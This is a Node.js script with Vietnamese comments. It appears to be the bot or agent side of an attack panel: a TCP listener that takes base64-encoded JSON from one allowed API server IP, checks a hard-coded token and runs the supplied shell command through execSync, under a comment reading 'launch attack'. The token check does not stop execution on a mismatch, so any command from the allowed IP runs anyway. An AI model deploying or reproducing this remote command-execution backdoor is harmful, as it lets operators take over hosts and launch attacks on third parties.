const net = require('net');
const exec = require('child_process').execSync;

const socket_port = 3000; // cổng API
const socket_token = "daukute432000"; //mã thông báo bí mật của bạn để bảo vệ kết nối TCP
const allowed_ips = ['42.96.0.125']; // IP máy chủ API

const server = net.createServer((socket) => {

    const remoteAddress = socket.remoteAddress.replace(/^.*:/, '');
    if (!allowed_ips.includes(remoteAddress)) {
        console.log(`Không cho phép kết nối từ ${remoteAddress}`);
        socket.write('failed');
        socket.end();
        return;
    }
  
    socket.on('data', (data) => {
        try {
            const json = JSON.parse(Buffer.from(data.toString(), 'base64').toString());

            if (json.socket_token !== socket_token) {
                socket.write('failed');
                socket.end();
            }

            //launch attack
            exec(json.command, function (error, stdout, stderr) {});

            console.log(`Đã nhận lệnh từ API: "${json.command}"`)
        
            socket.write('success');
        } catch (e) {
            console.log(`Không chạy được lệnh, ${e}`)
        
            socket.write('failed');
            socket.end();
        }
    });

    socket.on('error', (err) => { });

    socket.on('close', () => { });
});

server.listen(socket_port, () => {
    console.log(`Máy chủ đang nghe ${socket_port}`);
});
